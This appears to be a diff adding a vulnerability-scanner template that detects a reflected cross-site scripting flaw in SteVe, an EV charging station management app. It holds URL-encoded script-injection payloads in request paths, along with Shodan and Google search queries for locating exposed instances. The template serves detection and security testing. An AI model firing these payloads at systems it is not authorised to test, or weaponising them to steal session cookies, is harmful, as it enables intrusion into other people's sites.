@@ -1,0 +1,41 @@
+http:
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - <script>alert(document.domain)</script>/services/?stylesheet=1">
+        - part: header
+          type: word
+          words:
+            - text/html
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      method: GET
+      path:
+        - '{{BaseURL}}/steve/services/"%3E%3Cscript%3Ealert(document.domain)%3C/script%3E/services/'
+        - '{{BaseURL}}/services/"%3E%3Cscript%3Ealert(document.domain)%3C/script%3E/services/'
+      stop-at-first-match: true
+id: steve-xss
+info:
+    author: clem9669
+    classification:
+        cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
+        cvss-score: 5.4
+        cwe-id: CWE-80
+    description: |
+        SteVe contains a cross-site scripting vulnerability. An attacker can inject arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+    metadata:
+        google-query: intitle:"SteVe - Steckdosenverwaltung"
+        max-request: 2
+        shodan-query: http.title:"SteVe - Steckdosenverwaltung"
+        verified: true
+    name: SteVe - Cross-Site Scripting
+    reference:
+        - https://github.com/steve-community/steve
+    severity: medium
+    tags:
+        - steve
+        - oss
+        - SteVe
